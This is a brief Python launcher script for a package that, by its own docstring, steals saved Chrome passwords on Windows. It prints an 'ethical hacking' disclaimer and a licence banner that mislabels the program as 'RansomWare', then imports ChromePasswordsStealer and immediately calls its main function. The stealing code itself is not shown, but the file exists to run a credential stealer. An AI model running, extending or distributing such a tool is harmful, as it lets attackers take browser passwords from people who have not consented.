#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This package steal chrome password on Windows. """

###################
#    This package steal chrome password on Windows.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

print("""
Do not use this package for any ILLEGAL action.
I am creating this package for ETHICAL hacking.
""")

print(
    """
RansomWare  Copyright (C) 2021  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
)

try:
    from ChromePasswordsStealer import ChromePasswordsStealer, main as steal 
except ImportError:
    from .ChromePasswordsStealer import ChromePasswordsStealer, main as steal

steal()